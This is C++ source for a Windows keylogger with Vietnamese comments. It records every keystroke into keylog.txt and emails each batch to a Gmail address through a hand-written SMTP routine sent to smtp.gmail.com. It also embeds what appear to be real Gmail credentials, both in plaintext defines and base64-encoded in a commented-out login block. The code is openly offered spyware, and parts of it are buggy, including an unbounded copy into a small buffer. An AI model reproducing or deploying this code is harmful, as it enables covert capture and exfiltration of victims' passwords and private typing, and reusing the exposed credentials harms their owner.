#define _CRT_SECURE_NO_WARNINGS
#include<Windows.h>
#include<iostream>
#include<fstream>
#include<stdio.h>
#include<string>


#define UID "gmail full id :dinhtv1008@gmail.com"
#define PWD "gmail dinh1008a@"
//
#include<SmtpGuid.h>
#include<MailMsgProps.h>

using namespace std;
void sendEmail(char* server, char* to, char* from, char* subject, char* message);

int main()
{
	char key;
	ofstream logfile;//tạo đối tượng thao tác với file
	ifstream infile;
	int length = 0;
	char* buffer = NULL;
	while (TRUE)
	{
		Sleep(100);
		for (key = 8; key <= 190; key++)
		{
			/*
				//Dùng hàm GetAsyncKeyState(<Key cần nhập>) có trong thư viện: #include <Windows.h>
				Get là hàm trả về giá trị hoặc trạng thái.
				Async là hàm bất đồng bộ nghĩa là thay vì nó lock lại (hàm scanf) đợi khi đọc một ký tự thì nó kiểm tra có ký tự nòa không và trả về luôn. (Bạn xem các tài liệu đồng bộ và bất đồng bộ).
				Key đối tương lấy thông tin là một nút ấn.
				State trạng thái của nút đó ấn hay không được ấn,
			*/
			if (GetAsyncKeyState(key) == -32767)
			{
				logfile.open("keylog.txt", fstream::app); //mở file cho việc ghi dữ liệu
				switch (key) //break là thoát ra khỏi switch case
				{
				case VK_SPACE:
					//cout << " ";//nếu là khoảng trắng
					logfile << " ";
					break;
				case VK_RETURN:
					//cout << "\n"; //ấn enter
					logfile << "\n[ENTER]";
					break;
				case VK_SHIFT:
					//cout << "\"SHIFT\"";// ấn shift
					logfile << "\n[SHIFT]";
					break;
				case VK_BACK:
					//cout << "\"BACK\"";
					logfile << "\n[BACK]";
					break;
				case VK_CAPITAL:
					//cout << "\"[CAPSLOCK]\"";
					logfile << "\n[CAPSLOCK]";
					break;
				case VK_RBUTTON:
					//cout << "\"Rclick\"";
					logfile << "\n[Rclick]";
					break;
				case VK_LBUTTON:
					//cout << "\"Lclick\"";
					logfile << "\n[Lclick]";
					break;
				case 188:
					logfile << ",";
					break;
				case 190:
					logfile << ".";
					break;
				default:
					logfile << key;
					break;
				}
				logfile.close();

				infile.open("keylog.txt", fstream::in);
				infile.seekg(0, ios_base::end);//tìm đến vị trí cuối file
				length = infile.tellg();//trả về vị trí của con trỏ file
				cout << "do dai xau: " << length << endl;
				if (length >= 100)
				{
					infile.seekg(0, ios_base::beg);//tìm đến vị trí bắt đầu file
					buffer = (char*)calloc(1, length);
					infile.read(buffer, length);
					//gửi dữ liệu cho người khác
					sendEmail((char*)"smtp.gmail.com",(char*)"tvdinh1008@gmail.com", (char*)"dinhtv1008@gmail.com", (char*)"Keylogger", buffer);
					//
					infile.close();
					free(buffer);
					logfile.open("keylog.txt", fstream::trunc);//xóa nội dung file
					logfile.close();
				}
				else
				{
					infile.close();
				}

			}
		}
	}
	return 0;
}
void sendEmail(char* server, char* to, char* from, char* subject, char* message)
{
	SOCKET sockfd;
	WSADATA wsaData;
	hostent* host;
	sockaddr_in dest;

	int sent;
	char line[200];

	if (WSAStartup(0x202, &wsaData) != SOCKET_ERROR) {
		if ((host = gethostbyname(server)) != NULL) {
			// set memory.....
			memset(&dest, 0, sizeof(dest));
			memcpy(&(dest.sin_addr), host->h_addr, host->h_length);

			// prepare destinatioon.....
			dest.sin_family = host->h_addrtype;
			dest.sin_port = htons(25);

			cout << "\n Port: " << ntohs(dest.sin_port);
			cout << "\n IP" << inet_ntoa(dest.sin_addr);
			// get socket.....
			sockfd = socket(AF_INET, SOCK_STREAM, 0);

			// connect.....
			connect(sockfd, (struct sockaddr*) & dest, sizeof(dest));
			char buffer[1024];
			memset(buffer, 0, sizeof(buffer));
			/*
			strcpy(line, "openssl s_client -starttls smtp -crlf -connect " );
			char tm[1024];
			memset(tm, 0, sizeof(tm));
			strcpy(tm, inet_ntoa(dest.sin_addr));
			strncat(line, tm, strlen(tm));
			strncat(line,":587",4);
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);
			
			recv(sockfd, buffer, sizeof(buffer), 0);
			*/
			// send command lines.....
			strcpy(line, "HELO MyPCName\r\n");
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);

			
			memset(buffer, 0, sizeof(buffer));
			recv(sockfd, buffer, sizeof(buffer), 0);

 			strcpy_s(line, "EHLO dinh\r\n");
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);

			
			memset(buffer, 0, sizeof(buffer));
			recv(sockfd, buffer, sizeof(buffer), 0);
			
			strcpy_s(line, "STARTTLS\r\n");
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);
			memset(buffer, 0, sizeof(buffer));
			recv(sockfd, buffer, sizeof(buffer), 0);
			
			
			strcpy_s(line, "EHLO dinh\r\n");
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);
			memset(buffer, 0, sizeof(buffer));
			recv(sockfd, buffer, sizeof(buffer), 0); 
			/*
			strcpy_s(line, "AUTH LOGIN\n");
			char username[1024] = "ZGluaHR2MTAwOEBnbWFpbC5jb20=";
			char pass[1024] = "ZGluaDE5OTlhQA==";
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);

			memset(buffer, 0, sizeof(1024));
			recv(sockfd, buffer, sizeof(buffer), 0);
			sent = send(sockfd, username, strlen(username), 0);
			Sleep(500);
			memset(buffer, 0, sizeof(1024));
			recv(sockfd, buffer, sizeof(buffer), 0);
			sent = send(sockfd, pass, strlen(pass), 0);
			Sleep(500);
			memset(buffer, 0, sizeof(1024));
			recv(sockfd, buffer, sizeof(buffer), 0);
			*/
			strcpy(line, "MAIL FROM:<");
			strncat(line, from, strlen(from));
			strncat(line, ">\n", 3);
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);

			memset(buffer, 0, sizeof(buffer));
			recv(sockfd, buffer, sizeof(buffer), 0);

			strcpy(line, "RCPT TO:<");
			strncat(line, to, strlen(to));
			strncat(line, ">\n", 3);
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);


			memset(buffer, 0, sizeof(buffer));
			recv(sockfd, buffer, sizeof(buffer), 0);

			strcpy(line, "DATA\n");
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);
			memset(buffer, 0, sizeof(buffer));
			recv(sockfd, buffer, sizeof(buffer), 0);


			strcpy(line, "To:");
			strcat_s(line, to);
			strcat_s(line, "\n");
			strcat_s(line, "From:");
			strcat_s(line, from);
			strcat_s(line, "\n");
			strcat_s(line, "Subject:");
			strcat_s(line, subject);
			strcat_s(line, "\n");
			strcat_s(line, message);
			strcat_s(line, "\r\n.\r\n");
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);

			strcpy(line, "quit\n");
			sent = send(sockfd, line, strlen(line), 0);


			memset(buffer, 0, sizeof(buffer));
			recv(sockfd, buffer, sizeof(buffer), 0);
			Sleep(500);
		}
	}

	// close socket and wsadata
	closesocket(sockfd);
	WSACleanup();
	//khởi tạo winsock

	//phân giải tên miền

	//tạo socket kết nối connect

	//gửi mail

	//đóng socket


}